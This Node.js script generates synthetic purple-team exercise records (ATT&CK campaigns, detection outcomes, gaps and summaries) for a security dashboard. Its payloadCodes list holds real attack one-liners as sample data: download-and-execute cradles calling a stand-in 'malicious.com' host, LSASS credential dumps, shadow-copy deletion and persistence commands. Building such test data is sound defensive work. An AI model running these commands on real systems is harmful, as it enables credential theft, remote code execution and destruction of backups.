const fs = require('fs');
const path = require('path');

const campaigns = [
    {
        name: "APT29 Emulation",
        ttps: ["T1566.001", "T1059.001", "T1071.001", "T1078", "T1003.001", "T1569.002", "T1021.001"],
        environments: ["Windows Workstation", "Windows Server", "Azure / Entra ID"]
    },
    {
        name: "FIN7 Campaign",
        ttps: ["T1190", "T1059.003", "T1110.001", "T1087.001", "T1021.002", "T1048.002"],
        environments: ["Windows Server", "Linux"]
    },
    {
        name: "Scattered Spider Emulation",
        ttps: ["T1078.004", "T1098", "T1566.002", "T1562.001", "T1070.004"],
        environments: ["Azure / Entra ID", "macOS", "Windows Workstation"]
    },
    {
        name: "Wizard Spider Ransomware",
        ttps: ["T1566", "T1204.002", "T1053.005", "T1486", "T1490", "T1114.002"],
        environments: ["Windows Server", "Windows Workstation"]
    },
    {
        name: "APT33 Simulation",
        ttps: ["T1133", "T1543.003", "T1068", "T1548.002", "T1005", "T1090.001", "T1082"],
        environments: ["Linux", "Windows Server"]
    }
];

const realisticFindings = {
    Prevented: [
        "CrowdStrike Falcon successfully blocked execution before payload delivery.",
        "Palo Alto Cortex XDR intercepted and terminated the malicious process.",
        "Microsoft Defender for Endpoint quarantined the file upon disk write.",
        "Zscaler Internet Access blocked the connection to the known C2 domain.",
        "Okta blocked the authentication attempt due to anomalous geographic location.",
        "Windows Defender Application Control (WDAC) prevented execution of the unsigned binary."
    ],
    Alerted: [
        "Splunk ES generated a High severity alert, but execution was not natively blocked.",
        "CrowdStrike flagged the behavior as suspicious but allowed it to proceed.",
        "Azure Sentinel triggered an incident based on anomalous login behavior.",
        "Alert generated in the SIEM but automatic mitigation policy was in audit mode."
    ],
    Logged: [
        "Telemetry was captured in Splunk, but no alert or incident was generated.",
        "Sysmon logged the process creation event (Event ID 1), but EDR did not trigger.",
        "Authentication logs captured the event but it blended in with normal traffic.",
        "Flow logs show the connection was allowed and data was transferred, no alert."
    ],
    Missed: [
        "No telemetry or logs captured the activity. EDR was completely blind.",
        "Process executed successfully and bypassed all endpoint controls.",
        "Payload was delivered and executed without any network or endpoint visibility.",
        "Authentication succeeded with no MFA prompt or anomaly detection."
    ]
};

const gapResolutionNotes = [
    "Implemented new CrowdStrike IOA rule to block this behavior.",
    "Enabled MFA enforcement across all external facing applications.",
    "Updated Splunk correlation search to detect this specific command line argument.",
    "Deployed WDAC policy to block unsigned scripts in the environment.",
    "Configured Azure AD Conditional Access to block legacy authentication protocols."
];

const gapActionItems = [
    "Engineer a new detection rule in the SIEM for this activity.",
    "Review and tune EDR prevention policies for this host group.",
    "Implement network segmentation to prevent lateral movement.",
    "Require MFA for all service accounts.",
    "Require MFA for all service accounts.",
    "Patch the vulnerable application to the latest version."
];

const redTeamNotes = [
    "Deployed custom Python script to scrape credentials from memory. Execution was successful, memory dump was exfiltrated via DNS.",
    "Attempted to bypass UAC using fodhelper.exe. Command executed as standard user but failed to elevate privileges.",
    "Ran BloodHound ingestor (SharpHound.exe) from compromised endpoint. Mapped full AD domain.",
    "Executed PowerShell download cradle to pull secondary payload. Payload failed to execute due to execution policy.",
    "Modified registry keys to achieve persistence via Run keys. Validated survival after reboot.",
    "Utilized living-off-the-land binaries (certutil.exe) to download the next stage payload.",
    "Injected shellcode into explorer.exe to evade detection. C2 connection established.",
    "Ran simulated ransomware payload. 500 files encrypted before process crashed.",
    "Attempted lateral movement via WMI to domain controller. Access denied due to lack of privileges.",
    "Dumped LSASS memory using procdump.exe. File saved to C:\\Temp\\lsass.dmp."
];

const blueTeamNotes = [
    "EDR alerted on suspicious PowerShell activity. Analyst triaged and isolated host within 15 minutes.",
    "No alert generated in SIEM. Found evidence of execution in Sysmon Event ID 1 during retrospective hunt.",
    "CrowdStrike blocked the execution of SharpHound. Generated High severity incident.",
    "Authentication logs show successful logon from unusual IP. Conditional Access policy did not block it.",
    "Network traffic to known C2 IP was blocked by Palo Alto firewall. No host-level alert triggered.",
    "Windows Defender flagged the file as malicious and quarantined it immediately.",
    "Analyst noted abnormal volume of DNS requests to a newly registered domain. Created custom detection rule.",
    "Activity completely bypassed EDR. No telemetry available on the endpoint.",
    "Alert fired for LSASS memory dump. SOC escalated to Tier 3 for immediate response.",
    "Detected registry modification via Carbon Black, but alert was buried under low-fidelity noise."
];

const payloadCodes = [
    "powershell.exe -nop -exec bypass -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.5/payload.ps1')\"",
    "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"UpdateTask\" /t REG_SZ /d \"C:\\Temp\\malware.exe\" /f",
    "SharpHound.exe -c All -d target.local --domaincontroller 192.168.1.100",
    "certutil.exe -urlcache -split -f http://malicious.com/payload.exe C:\\Windows\\Temp\\payload.exe",
    "vssadmin.exe Delete Shadows /All /Quiet",
    "wmic process call create \"cmd.exe /c calc.exe\"",
    "procdump.exe -accepteula -ma lsass.exe C:\\Temp\\lsass.dmp",
    "schtasks /create /tn \"WindowsUpdater\" /tr \"C:\\Temp\\payload.exe\" /sc onlogon /ru System",
    "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 600 C:\\Temp\\lsass.dmp full",
    "bitsadmin /transfer myDownloadJob /download /priority normal http://malicious.com/payload.exe C:\\Temp\\payload.exe"
];

function randomChoice(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

function getOutcomeAndRating() {
    const rand = Math.random();
    if (rand < 0.4) return { outcome: "Prevented", rating: "Optimal" };
    if (rand < 0.6) return { outcome: "Alerted", rating: "Partial" };
    if (rand < 0.8) return { outcome: "Logged", rating: "Minimal" };
    return { outcome: "Missed", rating: "None" };
}

function getSeverity(rating, outcome) {
    if (rating === 'Optimal' || outcome === 'N/A' || outcome === 'Error') return 'N/A';
    if (outcome === 'Prevented' || outcome === 'Alerted') return 'Low';
    
    const rand = Math.random();
    if (rand < 0.2) return "Critical";
    if (rand < 0.6) return "High";
    if (rand < 0.9) return "Medium";
    return "Low";
}

const exercises = [];
const gaps = [];
const simulationSummaries = {};
const simulationEvidence = {};
let exIdCounter = 50000;
let gapIdCounter = 90000;

const months = ["January", "February", "March", "April", "May", "June"];

campaigns.forEach(campaign => {
    const numRuns = Math.floor(Math.random() * 3) + 1;
    
    for (let run = 0; run < numRuns; run++) {
        const baseDate = new Date(Date.now() - Math.floor(Math.random() * 180 * 24 * 3600 * 1000));
        const simName = `${campaign.name} (${months[baseDate.getMonth()]} 2026 Run ${run+1})`;
        
        const testResults = [];
        
        campaign.ttps.forEach(ttp => {
            const { outcome, rating } = getOutcomeAndRating();
            const finding = randomChoice(realisticFindings[outcome]);
            const exDate = new Date(baseDate.getTime() + (Math.random() * 5 * 24 * 3600 * 1000)).toISOString();
            const severity = getSeverity(rating, outcome);
            const env = randomChoice(campaign.environments);
            
            const findingName = `${campaign.name} - Simulated Execution of ${ttp}`;
            const exId = String(exIdCounter++);
            
            // Flat Exercise (for heatmaps)
            exercises.push({
                id: exId,
                ttp: ttp,
                simulation: simName,
                finding: findingName,
                outcome: outcome,
                coverageRating: rating,
                status: "Completed",
                environment: [env],
                date: exDate
            });
            
            const rExec = randomChoice(redTeamNotes);
            const rDet = randomChoice(blueTeamNotes);
            const rPayload = randomChoice(payloadCodes);

            // Test Result (for Simulation Summary)
            testResults.push({
                id: exId,
                name: findingName,
                outcome: outcome,
                coverageRating: rating,
                severity: severity,
                ttps: [ttp],
                execNotes: rExec,
                detNotes: rDet,
                payloadCode: rPayload,
                expectedOutcome: randomChoice(["Prevented", "Alerted", "Logged"]),
                eventType: "Payload"
            });
            
            // Generate Gap if Missed or Logged
            if (outcome === "Missed" || outcome === "Logged") {
                const isResolved = Math.random() < 0.6;
                const isAccepted = !isResolved && Math.random() < 0.2;
                
                let gapStatus = "Open";
                if (isResolved) gapStatus = "Resolved";
                else if (isAccepted) gapStatus = "Risk Accepted";
                else if (Math.random() < 0.3) gapStatus = "In Progress";
                
                let resolvedDate = null;
                let resolutionNotes = null;
                if (isResolved) {
                    const rDate = new Date(new Date(exDate).getTime() + (Math.random() * 30 * 24 * 3600 * 1000));
                    resolvedDate = rDate.toISOString();
                    resolutionNotes = randomChoice(gapResolutionNotes);
                }
                
                gaps.push({
                    id: String(gapIdCounter++),
                    displayId: 'GAP-' + Math.floor(1000 + Math.random() * 9000),
                    ttp: ttp,
                    simulation: simName,
                    finding: findingName, // Exact match for proc matching
                    outcome: outcome,
                    coverageRating: rating,
                    status: gapStatus,
                    severity: severity,
                    priorityScore: severity === 'Critical' ? 90 : severity === 'High' ? 70 : 50,
                    createdDate: exDate,
                    resolvedDate: resolvedDate,
                    resolutionNotes: resolutionNotes,
                    actionItems: randomChoice(gapActionItems),
                    stakeholders: 'Detection Engineering',
                    environment: [env],
                    ticketLink: `JIRA-${Math.floor(Math.random() * 9000) + 1000}`,
                    details: `Execution: ${rExec}\nDetection: ${rDet}`
                });
            }
        });
        
        // Construct Simulation Summary
        simulationSummaries[simName] = {
            summary: `## Executive Summary\nThis simulation tested the organization's defenses against ${campaign.name} TTPs. Results were mixed, highlighting key areas for improvement.\n\n## Key Findings\nSeveral critical detection gaps were identified during execution.\n\n## Risk Analysis\nUnmitigated gaps could allow threat actors to establish persistence undetected.\n\n## Recommendations\nImplement stronger network segmentation and enhance EDR logging.`,
            details: {
                name: simName,
                environmentCategory: campaign.environments,
                goals: `Validate defensive posture against ${campaign.name}`,
                participants: [{ name: 'Blue Team', role: 'SOC' }, { name: 'Red Team', role: 'Adversary Emulation' }]
            },
            attackChain: [], // Visual attack chain graph usually built by UI
            testResults: testResults,
            timestamp: baseDate.toISOString()
        };
        
        simulationEvidence[simName] = [];
    }
});

const outputData = {
    exercises,
    gaps,
    simulationSummaries,
    simulationEvidence
};

fs.writeFileSync(path.join(__dirname, 'realistic_data.json'), JSON.stringify(outputData, null, 2));
console.log(`Successfully generated realistic_data.json with ${exercises.length} exercises, ${gaps.length} correlated gaps, and ${Object.keys(simulationSummaries).length} simulation summaries.`);
